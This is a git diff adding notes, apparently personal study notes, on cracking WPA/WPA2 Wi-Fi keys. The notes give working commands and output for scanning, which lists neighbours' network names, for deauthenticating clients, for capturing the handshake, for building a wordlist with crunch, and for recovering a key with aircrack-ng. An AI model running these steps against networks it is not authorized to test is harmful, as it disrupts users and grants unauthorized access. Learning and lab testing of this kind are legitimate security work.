@@ -537,3 +537,157 @@
 - Now, if WPS is disabled on the target network, or if it's enabled but configured to use push button configuration (PBC), than the method we disucssed just now before will not work. Therefore, we will have to go and crack the actual WPA/WPA2 Encryption.
 
 - In WPA/WPA2 the keys are unique, they are temporary, and are much longer than WEP. Therefore, the packets sent in the air contained no information that is useful for us. So, it doesn't matter even if we capture 1 million packets, we can't use them to crack the key.
+
+- The only packets that contain useful information are the handshake packets, also known as 4-way handshake packets. These are 4 packets transferred b/w a client and an access point when the client tries to connect to the access point.
+
+- We will start by running `airodump-ng` to get info about the networks in the area.
+
+  ```bash
+  root@kali:~# airodump-ng --band abg
+   CH 48 ][ Elapsed: 36 s ][ 2025-07-28 06:50 
+  
+   BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+  
+   C4:95:4D:37:AE:61   -1        0        1    0  11   -1   WPA              <length:  0>         
+   E4:FA:C4:3C:9F:0E   -1        0        2    0  36   -1   WPA              <length:  0>         
+   E4:FA:C4:0C:F3:33  -72        0        0    0  -1   -1                    <length:  0>         
+   44:95:3B:88:14:C1  -74       10        0    0 153  866   WPA2 CCMP   PSK  Goldenenclave603     
+   B4:3D:08:2D:91:40  -80       10        0    0 149  866   WPA2 CCMP   PSK  Rahul Agarwal_5G     
+   30:DE:4B:B5:3C:19  -82       15        0    0  44  390   WPA2 CCMP   PSK  RakshaDeepak_5g      
+   6C:4F:89:16:4F:FA  -80       16        0    0  40  866   WPA2 CCMP   PSK  Airtel_Sathvik
+   CE:82:A9:6D:BB:76  -59        5        0    0  11  260   WPA2 CCMP   PSK  Avik                 
+   B4:3D:08:2D:91:41  -54        4        0    0  10  270   WPA2 CCMP   PSK  Rahul Agarwal_2.4G   
+   20:0C:86:43:98:98  -76        5        0    0  13  270   WPA2 CCMP   PSK  SM-2.4G              
+   22:0C:86:53:98:98  -66        6        0    0  13  270   WPA2 CCMP   PSK  www.excitel.com      
+  ```
+  
+- So, as we can see, we have a lot of Networks in the area using WPA2 Encryption. The next thing we will do is we will capture the packets on the target network of our choice using `airodump-ng`.
+
+  ```bash
+  root@kali:~# airodump-ng --bssid TARGET_MAC -c TARGET_CHANNEL -w filename wlan0
+  ```
+
+- Let's say no one is actually connecting to the target network, so what we can do is we can deauthenticate a client from the network, so that it reconnects and we can capture the handshake packets. This we can do using the command:
+
+  ```bash
+  root@kali:~# aireplay-ng --deauth 1000000 -a TARGET_MAC -c CLIENT_MAC -D wlan0
+  ```
+  
+- Once, the client is deauthenticated, it will try to reconnect to the access point, and in the process it will send the handshake packets. We can capture these packets using `airodump-ng` command we ran earlier.
+
+- Once, the handshake is captured, we can exit `airodump-ng` by pressing `Ctrl+C`. The handshake packets will be saved in the file we specified using the `-w` option.
+
+- This handshake can be used to get the key for the network.
+
+- Let's implement this practically, and see the actual logs in the scenario.
+
+- Let's assume that there is no handshake happening on the target network, so we will deauthenticate a client from the network, and then capture the handshake packets. First, we will run the `airodump-ng` command to capture the packets.
+
+  ```bash
+  root@kali:~# airodump-ng --bssid WIFI_MAC --channel 36 -w capture wlan0
+  07:30:14  Created capture file "capture-02.cap".
+  
+   CH 36 ][ Elapsed: 54 s ][ 2025-07-28 07:31 ][ WPA handshake: WIFI_MAC 
+  
+   BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+  
+   WIFI_MAC  -18 100      544      281    0  36  780   WPA2 CCMP   PSK  WIFI_NAME
+  
+   BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+  
+   WIFI_MAC  CLIENT_MAC1  -29    6e-24      1      272                           
+   WIFI_MAC  CLIENT_MAC2  -24    6e- 6e     2      690                           
+   WIFI_MAC  CLIENT_MAC3  -25    6e- 1e   141     3012  EAPOL                    
+  Quitting...
+  ```
+  
+- Than, use fake authentication attack to associate with the access point, so that we can send deauthentication packets to the clients, and as a result cause a handshake to happen.
+
+  ```bash
+  root@kali:~# aireplay-ng --deauth 1000000 -a WIFI_MAC -c CLIENT_MAC -D wlan0
+  07:30:45  Sending 64 directed DeAuth (code 7). STMAC: [CLIENT_MAC] [15|88 ACKs]
+  07:30:46  Sending 64 directed DeAuth (code 7). STMAC: [CLIENT_MAC] [ 3|64 ACKs]
+  07:30:47  Sending 64 directed DeAuth (code 7). STMAC: [CLIENT_MAC] [ 0|64 ACKs]
+  07:30:47  Sending 64 directed DeAuth (code 7). STMAC: [CLIENT_MAC] [ 4|64 ACKs]
+  07:30:48  Sending 64 directed DeAuth (code 7). STMAC: [CLIENT_MAC] [ 0|64 ACKs]
+  ```
+  
+- Exit the airodump-ng command as soon as you see the `WPA handshake` message in the logs. This means that the handshake packets are captured and saved in the file we specified using the `-w` option.
+
+## Creating a Wordlist
+
+- So, far we have learnt that the only packets that are useful for cracking the WPA/WPA2 key are the handshake packets. We have also learnt how to capture these packets using `airodump-ng` and `aireplay-ng`.
+
+- Now, handshake packets doesnot contain any information that can help us to recover or recalculate the WPA-KEY. The information in it can only be used to check whether a password is valid or not. 
+
+- Therefore, what we are going to do is create a wordlist, which is basically a big text file that contains a large number of passwords. Than go through this file, passwords one by one, and use them with the handshake inorder to check whether the password is valid or not. We can download ready wordlist from internet, but here we will create our own word list.
+
+- we will use the `crunch` command to create a wordlist. The `crunch` command is a powerful tool that can be used to create custom wordlists based on various parameters.
+
+- It's a really handy skill to have under the belt, if you want to be a penetration tester or an ethical hacker, because you will be facing lot of scenarios where a wordlist attack can become very handy.
+
+- The generalised syntax of the `crunch` command is as follows:
+
+  ```bash
+  crunch <min_length> <max_length> -o <output_file> -t <pattern>
+  ```
+  
+  Implementation example:
+  
+  ```bash
+  root@kali:~# crunch 8 8 1234567890 -o test.txt
+  Crunch will now generate the following amount of data: 900000000 bytes
+  858 MB
+  0 GB
+  0 TB
+  0 PB
+  Crunch will now generate the following number of lines: 100000000 
+  
+  crunch:  94% completed generating output
+  
+  crunch: 100% completed generating output
+  ```
+  
+## Cracking WPA/WPA2 Key using a Wordlist Attack
+
+- To crack a WPA/WPA2 key we need 2 things:
+
+  1. The handshake packets we captured earlier using `airodump-ng`.
+  2. A wordlist that contains a large number of passwords.
+
+- And, hopefully one of the passwords in the wordlist is the actual password for the target network.
+
+- To do this, `aircrack-ng` is going to unpack the handshake, and extract the useful information. The `MIC` also known as `Message Integrity Code` is used to verify the integrity of the message, and is also used to verify whether the password is correct or not.
+
+>[!NOTE]
+>This MIC is used by the Access Point to verify whether the passowrd is correct or not, so it's going to seprate this, and keep it aside, and use all of the other information here combined with the first password from the wordlist to generate an MIC, another MIC, and than compare it with one extracted from the handshake. If they match, it means the password is correct, and we have successfully cracked the WPA/WPA2 key.
+
+- Use the following command to crack the WPA/WPA2 key using a wordlist:
+
+  ```bash
+  root@kali:~# aircrack-ng filename.cap -w wordlist.txt
+  ```
+  
+  You will get output like this:
+
+  ```bash
+  [00:32:04] 4439496/10000000 keys tested (2275.52 k/s) 
+
+  Time left: 40 minutes, 43 seconds                         44.39%
+
+                   Current passphrase: 75541687                   
+                       KEY FOUND! [ 75541687 ]
+
+  Master Key     : 49 88 ED F4 B8 F3 E3 B9 7D 8A E4 FB C6 35 EA 27 
+                   F7 6D A2 2F CD B2 3A 05 DD 2E BF FE BE 66 4D F2 
+
+  Transient Key  : E8 77 89 1B 74 27 94 DC 85 B2 45 EA 86 22 D7 14 
+                   41 B9 42 17 D6 1A 9B 34 26 08 B3 81 D1 33 B6 C5 
+                   BB 04 19 9E 78 EB EA AB 85 EE E3 27 D0 27 7E 0E 
+  EAPOL HMAC     : C8 AB 3E C5 C3 62 5F 2D EE 37 3E 71 B5 3A F2 0E 
+
+  ```
+
+- You can use this password to connect to the target network. Here's the proof of my Wifi Password.
+
+  ![](../imgs/WhatsApp%20Image%202025-07-28%20at%2019.40.07.jpeg)
